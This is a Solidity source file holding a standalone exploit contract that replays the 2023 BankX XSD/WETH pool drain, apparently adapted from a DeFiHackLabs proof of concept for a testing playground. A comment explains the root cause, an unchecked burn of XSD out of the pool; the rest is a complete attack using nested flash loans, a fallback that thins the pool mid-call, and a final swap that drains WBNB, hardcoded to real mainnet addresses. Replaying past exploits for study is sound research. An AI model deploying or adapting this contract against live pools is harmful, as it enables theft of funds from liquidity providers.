// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-09-XSDWETHpool).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the nested DODO flash-loan callback `DPPFlashLoanCall` and the
// payable `fallback()` (which re-positions the pool mid-router-call) both live
// on the test itself (`assetTo = address(this)`), and the attacker's starting
// XSD bag comes from `deal(XSD, address(this), 39,566.238 XSD)`. There is no
// standalone contract to deploy and the attack needs a cheatcode-funded token
// balance, so this is a faithful, self-contained copy of that inline attack
// (testExploit body + DPPFlashLoanCall + fallback + minimal inline interfaces
// — no imports so it compiles anywhere), compiled inside the registry forge
// project. Logic and constants are copied verbatim from
// test/XSDWETHpool_exp.sol; the `deal()` cheatcode is replaced by a
// `dealToken` pre-attack setup step in the config (see
// scripts/poc-configs/2023-09-XSDWETHpool.mjs).
//
// Root cause: BankX Router.swapXSDForETH(amountOut, amountInMax) pulls the
// FULL attacker-chosen `amountInMax` of XSD into the pool, does a near-dust
// swap for `amountOut`, sends the ETH out (handing control back to the
// attacker's fallback before continuing), and then unconditionally burns
// `amountInMax/10` of XSD directly OUT OF THE POOL via
// XSD.burnpoolXSD(amountInMax/10) — a one-sided reserve deletion followed by
// pool.sync() with NO K-invariant check and NO compensating WBNB outflow.
// The attacker times the burn to land on a pool it has just thinned to
// ~3,963 XSD (via a self-directed swap inside the ETH-transfer fallback), so
// the burn (3,956.62 XSD) wipes ~99.8% of the XSD reserve while leaving the
// WBNB side untouched, then dumps its parked XSD bag back in to drain WBNB.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IXSDRouter {
    function swapXSDForETH(uint256 amountOut, uint256 amountInMax) external;
    function swapETHForBankX(uint256 amountOut) external payable;
}

interface IXSDWETHpool {
    function swap(uint256 amount0Out, uint256 amount1Out, address to) external;
}

interface IPIDController {
    function systemCalculations() external;
}

interface IDPPFlash {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract XSDWETHpoolDrain {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IDPPFlash constant DPPOracle = IDPPFlash(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPFlash constant DPPAdvance = IDPPFlash(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IERC20 constant XSD = IERC20(0x39400E67820c88A9D67F4F9c1fbf86f3D688e9F6);
    IXSDRouter constant Router = IXSDRouter(0xfADDa925e10d07430f5d7461689fd90d3D81bB48);
    IXSDWETHpool constant XSDWETHpool = IXSDWETHpool(0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d);
    IPIDController constant PIDController = IPIDController(0x82a6405B9C38Eb1d012c7B06642dcb3D7792981B);

    uint256 constant baseAmount = 3_000_000_000_000_000_000_000; // 3,000 WBNB, outer DPPOracle flash loan
    uint256 constant moreAmount = 1_000_000_000_000_000_000_000; // 1,000 WBNB, inner DPPAdvance flash loan
    uint256 constant attackAmount = 3_800_000_000_000_000_000_000; // 3,800 WBNB donated into the pool (step 2a)
    uint256 constant swapAmount = 263_932_735_529_288_914_857_295; // XSD bag bought (2b) and dumped back (step 4)
    uint256 constant exploitAmount = 56_964_339_410_199_718_035; // final net WBNB profit

    // unrecorded (constructor boilerplate) — mirrors the test's approveAll().
    constructor() {
        WBNB.approve(0x224E13D9eAB11eDc09411ef4bF800791a7EF6135, type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        XSD.approve(address(Router), type(uint256).max);
    }

    // step 1: borrow 3,000 WBNB from DPPOracle. Everything else happens inside
    // the nested flash-loan callbacks and the router's mid-call fallback hook.
    function run() external {
        DPPOracle.flashLoan(baseAmount, 0, address(this), abi.encode(baseAmount));
    }

    // DODO flash-loan callback, reused for BOTH DPPOracle (outer) and
    // DPPAdvance (inner) — disambiguated by which amount was encoded in `data`.
    function DPPFlashLoanCall(address sender, uint256 amount, uint256 quoteAmount, bytes calldata data) external {
        if (abi.decode(data, (uint256)) == baseAmount) {
            // Outer callback: borrow the inner 1,000 WBNB, then repay the outer loan
            // (repayment happens AFTER the inner callback below has run its course).
            DPPAdvance.flashLoan(moreAmount, 0, address(this), abi.encode(moreAmount));
            WBNB.transfer(address(DPPOracle), baseAmount);
        } else {
            // Inner callback: this is where the router is invoked. amountOut is
            // deliberately tiny (9.84 WBNB) — the swap itself doesn't matter; its
            // only jobs are (a) donate the full 39,566 XSD ceiling into the pool
            // and (b) reach the router's burnpoolXSD() call further down its body.
            uint256 amountOut = 9_840_000_000_000_000_000;
            Router.swapXSDForETH(amountOut, XSD.balanceOf(address(this)));
            // Second (independent) donation of the pre-bought XSD bag — this runs
            // AFTER swapXSDForETH returns (i.e. after burnpoolXSD already fired
            // inside it), setting up the exit swap in step 4.
            XSD.transfer(address(XSDWETHpool), swapAmount);
            XSDWETHpool.swap(0, attackAmount + exploitAmount, address(this));
            WBNB.transfer(address(DPPAdvance), moreAmount);
        }
    }

    // The router's swapXSDForETH() sends the swap's tiny WBNB output as native
    // BNB via a low-level call with empty data (TransferHelper.safeTransferETH)
    // — with no receive() defined, that lands here (payable fallback), handing
    // control back to the attacker BEFORE the router's burnpoolXSD() call.
    fallback() external payable {
        // Step 2a: donate 3,800 WBNB into the pool so the exit swap (step 4) has
        // a fat WBNB side to drain.
        WBNB.transfer(address(XSDWETHpool), attackAmount);
        // Step 2b: buy the entire thin XSD reserve for itself, crashing the pool
        // to ~3,963.9 XSD / 3,857.07 WBNB right before control returns to the
        // router's burnpoolXSD() call.
        XSDWETHpool.swap(swapAmount, 0, address(this));
        // Refresh oracle/system state so the router's later checks pass.
        PIDController.systemCalculations();
        Router.swapETHForBankX{value: 1_000_000_000_000}(100);
    }
}
